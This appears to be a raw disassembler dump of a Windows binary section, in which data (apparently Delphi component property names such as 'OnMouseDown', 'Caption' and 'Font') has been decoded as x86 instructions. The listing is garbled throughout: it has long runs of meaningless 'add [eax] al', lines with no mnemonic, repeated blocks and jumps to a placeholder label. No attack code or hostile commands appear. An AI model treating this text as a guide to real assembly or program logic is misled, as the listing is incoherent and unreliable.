add [ eax + 0x64 ] cl
inc ebx
add al bl
xchg ecx eax
inc ecx
add [ edx + edx * 4 + 0x41 ] dl
add [ ecx ] al
add bh bh
inc [ esp + 0x43 ]
add [ 0x61745354 ] cl
je r-xdata
inc ebx
add [ eax + ebp ] dh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
add [ eax ] al
add dl al
daa
inc ebx
add [ esi ] bl
popad
jb r-xdata
mov eax eax
les esp [ 0x43 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc ebx
add [ eax ] cl
sbb [ ebx + edx * 2 + 0x42 ] dl
inc ebx
jb r-xdata
sub [ ebx ] al
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn 0x4327
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
inc edx
add [ esp + esi - 0x5433ffc0 ] dh
fmul [ edi ]
inc edx
add [ esp + esi + 0x9300040 ] ch
inc ebp
jbe r-xdata
sub [ ebx ] al
cmp [ edx ] al
add [ eax ] al
dec esp
sub eax [ eax + eax - 0x24 ]
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
outsb
je r-xdata
add cl [ eax ]
sub_432762
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ ebp + 0x43 ] ch
add ah bl
mov eax [ 0x65f00044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43298e
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ ebp + 0x43 ] ch
add ah bl
mov eax [ 0x65f00044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_432b75
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
js r-xdata
add bh bh
sub al 0x8c
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0017 ] al
outsd
outsb
jae r-xdata
inc edx
add [ eax ] ch
add bh bh
pop eax
push 0x6ec00044
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
add [ eax ] cl
add al [ eax ]
dec esp
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50060018 ] al
popad
outsb
insb
jae r-xdata
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
adc [ eax ] al
pop ecx
add [ eax ] al
call [ eax + 0x1004468 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi + 0x74 ] 0x43260473
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
adc [ eax ] al
adc al 0x2
add bh bh
fsub [ esi + 0x43 ]
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc eax
add [ 0x48ff0002 ] dl
push 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebx + 0x69 ] dl
jpe r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
jmp [ eax ]
add [ eax ] dl
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
and [ eax + eax ] 0x7
dec edi
outsb
inc ebx
inc edi
jb r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
in al 0x67
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0020 ] al
imul ebp [ ebp + 0x70 ] 0x6554656c
js r-xdata
outsb
jne r-xdata
add [ eax ] al
pop ds
add [ ebx ] cl
push ebx
imul ebp [ ebp + 0x70 ] 0x6150656c
outsb
insb
lodsb [ esi ]
add [ eax ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
inc ebx
outsd
outsb
je r-xdata
jo r-xdata
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
add al [ eax ]
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc ebp
outsb
inc esp
inc esp
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
pop ss
add al [ eax ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ ebx ] cl
push esp
pop eax
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
jo r-xdata
jb r-xdata
jo r-xdata
and [ eax + eax ] eax
dec ebp
outsd
jbe r-xdata
js r-xdata
push ds
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push esp
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
inc ebx
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f120026 ] al
outsb
inc ebx
jb r-xdata
inc esp
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
jb r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
popad
je r-xdata
jno r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
xor [ ebx ] al
mov eax 0x4330
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x30 ] bp
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al ah
das
inc ebx
add [ esi ] al
push 0x78655473
je r-xdata
jpe r-xdata
insb
push esp
pop eax
inc ecx
add al bh
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
jb r-xdata
add al ah
jb r-xdata
mov eax eax
jo r-xdata
inc ebx
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
push 0x6e774f73
jb r-xdata
add [ eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
cmp [ ecx ] ah
inc esp
add [ eax ] al
dec edi
outsb
dec ebp
outsd
jne r-xdata
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : ebx ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add [ eax ] eax
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
jo r-xdata
add [ eax ] ch
nop
inc ecx
add [ eax - 0x70 ] bl
inc ecx
add [ eax - 0x70 ] dl
inc ecx
add [ eax + 0x71 ] bh
inc ebx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0xc0040 ] ch
xor al [ eax ]
and al 0x32
inc eax
add ah bl
mov es [ ecx ]
inc eax
add [ eax ] al
add [ eax + 0x34a00041 ] cl
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc ebx
add [ eax ] al
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
or al 0x0
insb
jae r-xdata
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
mov al [ 0xffffffffac004034 ]
xor al 0x40
inc esp
jb r-xdata
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
inc ebp
add [ eax ] ah
add [ eax ] al
push esp
jae r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
pop ds
add [ eax ] al
call [ ebx + esi * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
add [ eax ] eax
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
add [ eax ] dl
inc eax
add [ esi ] bl
inc ebx
add [ eax ] bl
popad
inc ecx
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
outsb
je r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
lea eax [ eax ]
mov eax 0x7004330
push cs
push esp
dec eax
popad
push ebx
je r-xdata
or ecx [ edi + 0x6e ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x47ffbcd0 ] dl
xor [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax + 0x30 ] 0x43
add [ eax ] al
add [ eax ] al
mov [ 0x28004330 ] al
in al 0x2f
inc ebx
add [ ebx ] al
adc edx [ eax + ecx * 2 + 0x65 ]
popad
jb r-xdata
add bh bh
pop eax
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490a0004 ] al
insd
popad
dec ecx
outsb
js r-xdata
push esp
adc [ eax ] al
push ebx
imul edi [ edx + 0x65 ] r-xdata
and al 0x0
add bh bh
dec esp
jb r-xdata
inc ecx
add [ eax + eax ] ah
insb
jae r-xdata
add [ eax ] al
[ esi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
adc [ eax ] al
push ds
add [ eax ] al
add [ edx + 0x28004330 ] ah
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push ebx
je r-xdata
inc ebx
add [ 0x74ff0000 ] bl
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ eax ] cl
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
add [ eax ] dl
inc eax
add [ 0x68ff0000 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop es
add [ esi ] cl
push eax
popad
jb r-xdata
adc [ eax ] al
sbb [ eax ] al
add bh bh
xor al 0x73
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] 0x27
add [ eax ] al
add eax 0x614d0800
js r-xdata
add [ eax + 0x72 ] ah
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080003 ] al
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
add [ eax + 0x1c004156 ] bl
add [ eax ] al
inc [ ebx + esi * 2 ]
xor [ ecx + eax * 2 + 0x418c3800 ] cl
add ah dl
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5705000a ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add eax 0x6c797453
lodsb [ gs : esi ]
adc [ eax ] al
or al 0x0
add bh bh
test [ ebx + 0x43 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040009 ] al
js r-xdata
add [ eax ] al
inc [ ebx + esi * 2 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] eax
add al 0x54
add [ ecx ] al
add [ eax ] al
imul esp [ esp + esi * 2 + 0x68 ] 0x4332ac90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
xor al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x32
inc ebx
add ah bl
xor al [ ebx ]
sbb al 0x0
add [ eax ] al
inc esp
popad
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax + 0x8004034 ] ch
outsb
je r-xdata
push [ ebx + esi * 2 + 0x43 ]
adc al 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
add [ ebp + edx * 4 - 0x6a77ffbf ] al
inc ecx
add [ ebp + edx * 4 - 0x6a83ffbf ] cl
inc ecx
add [ esp + esi * 2 + 0x43 ] ch
add al bl
xchg ecx eax
inc ecx
add [ edx + edx * 4 + 0x41 ] dl
add [ ecx ] al
add bh bh
[ eax + 0x74 ]
add [ eax - 0x6f ] al
inc ecx
push esp
adc [ eax ] al
adc [ eax ] al
add bh bh
lodsb [ esi ]
jae r-xdata
push esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
das
xor al [ eax ]
and al 0x32
inc eax
add ah dl
nop
inc ecx
add [ eax ] dh
mov [ ecx ] es
cmp [ ecx + eax * 2 + 0x41914000 ] cl
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax ] cl
add [ ecx ] al
add [ eax ] al
sub_4336fe
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dl
jbe r-xdata
add eax 0xb3004700
push [ edx - 0x4f004e01 ]
[ edi - 0x49005101 ]
add ah bl
mov eax [ 0x773c0044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ edi + esi * 2 - 0x2f97ffbd ] ah
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_43394f
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
js r-xdata
add bh bh
rol [ eax ] 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi ] al
dec ecx
inc edx
add [ eax ] ch
add bh bh
pop eax
push 0x68680044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
add [ eax ] cl
add al [ eax ]
dec [ eax + 0x7b ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080019 ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
sbb al 0x44
add [ eax + eax ] dh
[ esp + ecx * 4 ]
jmp [ eax ]
insd
popad
jae r-xdata
aaa
inc ebp
add [ eax ] ch
add al [ eax ]
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060017 ] al
outsb
jae r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
or [ ebx + 0x65 ] dl
arpl [ ecx + ebp * 2 + 0x6f ] si
xor eax 0x22c0043
add bh bh
and [ ebx + 0x43 ] bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5305001a ] al
je r-xdata
je r-xdata
insb
jl r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0020 ] al
outsb
push ebx
outsd
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001c ] al
outsb
inc esp
jb r-xdata
inc ebx
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
je r-xdata
jpe r-xdata
push 0x1ff0002
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f10001f ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
outsb
inc esp
jb r-xdata
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
adc al 0x4f
outsb
inc ebx
jb r-xdata
add bh bh
jb r-xdata
outsd
outsb
push cs
push esp
dec eax
popad
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pushad
xor al 0x43
add [ eax + 0x2 ] bl
add bh bh
pop eax
add al [ eax ]
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push edx
jae r-xdata
clc
xor eax [ ebx ]
push eax
add al [ eax ]
call [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
cmovg ebp [ esi + 0x53 ]
inc esp
jb r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
pushad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
clc
xor eax [ ebx ]
dec eax
add al [ eax ]
dec [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6e4f0e00
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
add al [ eax ]
jmp [ eax + 0x2 ]
popad
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
insb
push cs
push esp
dec eax
popad
jb r-xdata
or eax 0x64616548
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
adc al [ edx + edx * 2 ]
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x7 ] si
push eax
jb r-xdata
arpl [ ebx - 0x75 ] bp
sar [ eax ] 0x3b
inc ebx
add [ eax ] cl
adc [ esp + eax * 2 + 0x72 ] edx
popad
ja r-xdata
adc [ eax ] al
lea eax [ eax ]
mov eax 0x800433b
adc edx [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esi
outsd
je r-xdata
outsb
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0021 ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
push esp
pop eax
inc ecx
add [ eax + 0x2 ] ch
add bh bh
pushad
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d001e ] al
outsb
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebx
insb
popad
jae r-xdata
cmp eax 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add [ 0x74646957 ] al
push 0x746e4907
jb r-xdata
or [ 0x64616548 ] cl
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x63617254
imul eax [ ebp + 0x76 ] 0x65
outsd
outsb
je r-xdata
popad
jb r-xdata
jae r-xdata
jae r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
jb r-xdata
jns r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
outsb
outsd
insb
xor eax [ ebx ]
inc eax
add al [ eax ]
inc [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb al 0x0
or eax 0x72446e4f
popad
add eax 0x74617453
adc dl [ gs : ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
adc dl [ ebx + edx * 2 + 0x65 ]
outsd
outsb
je r-xdata
imul ebp [ edi + 0x6e ] 0x69570500
je r-xdata
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
push cs
push esp
dec eax
jb r-xdata
add al 0x8
or eax 0x64616548
jb r-xdata
imul ebp [ edi + 0x6e ] 0x6548540e
popad
outsd
push esp
dec eax
popad
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add ah cl
cmp eax 0x30b40043
inc ebx
add [ ebx + 0x433c14c0 ] cl
add [ eax ] cl
adc dl [ ebx + edx * 2 + 0x65 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
push esp
jb r-xdata
add [ eax + esi - 0x3f74ffbd ] dh
pop es
adc al 0x3c
inc ebx
mov eax eax
jbe r-xdata
inc edx
outsd
outsd
insb
popad
outsb
add ah cl
cmp eax 0x30b40043
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x6c004375 ] bh
arpl [ ebx + 0x53 ] bp
add [ eax ] al
add al dl
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
add [ eax ] dh
pop es
dec ecx
outsb
je r-xdata
arpl [ ebx + 0x45 ] bp
jbe r-xdata
outsb
je r-xdata
outsd
insb
push cs
push esp
dec eax
popad
jb r-xdata
fild [ eax + eax - 0x6c ]
mov [ 0xffffffff8b4c0044 ] eax
inc ecx
insb
je r-xdata
je r-xdata
outsd
outsb
je r-xdata
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
jb r-xdata
cmp eax 0x30b40043
inc ebx
add [ eax + edx + 0x40 ] dl
add [ eax ] bl
xor eax [ ebx ]
mov eax eax
call sub_437fdd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
add cl [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
add [ eax + ecx * 4 ] dl
inc esp
add al dh
add [ ebx ] 0x48
nop
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
call 0xffffffff8043808d
salc
inc esp
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ ecx + eax * 4 ] cl
inc ebx
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
inc esp
add [ ebx + ecx * 4 + 0x41 ] cl
add ah cl
add [ eax ] al
add [ eax ] al
mov esp 0x7800433d
add al [ eax ]
add [ eax ] ch
inc ebx
add ah bl
cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
outsb
push cs
outsd
insb
or [ edi ] al
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsd
insb
or [ edi ] al
push ebx
sub_433d72
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dl
jbe r-xdata
outsb
je r-xdata
add ah bl
mov eax [ 0x773c0044 ]
inc ebx
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add [ edi + esi * 2 - 0x2f97ffbd ] ah
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
pop edi
add [ eax ] al
push [ eax ]
outsd
insb
nop
sar [ 0xe070043 ] 0x1
push esp
dec eax
popad
jb r-xdata
add [ eax ] al
add [ ecx ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ edx ] ah
add al [ eax ]
push [ ebx + edi * 2 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
or al 0x57
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xf865646f
add [ eax ] cl
inc edx
outsd
insb
call 0xffffffffb0438121
aaa
inc ebx
add [ ebx ] dh
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
adc [ eax ] al
and [ edx ] al
add bh bh
clc
jpe r-xdata
popad
jb r-xdata
add bh bh
jpe r-xdata
add dh bh
mov [ eax + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000d ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
